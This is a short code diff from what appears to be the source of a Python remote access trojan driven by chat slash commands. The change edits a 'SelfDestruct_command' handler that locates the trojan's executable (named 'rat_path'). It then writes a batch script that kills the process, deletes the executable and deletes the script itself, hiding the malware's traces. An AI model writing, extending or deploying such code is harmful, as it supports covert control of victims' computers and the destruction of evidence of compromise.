@@ -977,7 +977,7 @@ async def SelfDestruct_command(ctx: SlashContext):
         pid = os.getpid()
         temp = (os.getenv("temp"))
         cwd = os.getcwd()
-        cwd2 = os.path.splitext(os.path.basename(__file__))[0]
+        cwd2 = sys.argv[0]
         rat_path = f'{cwd}\\{cwd2}.exe'
         ###### Remove temp files ######
         bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + rat_path + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
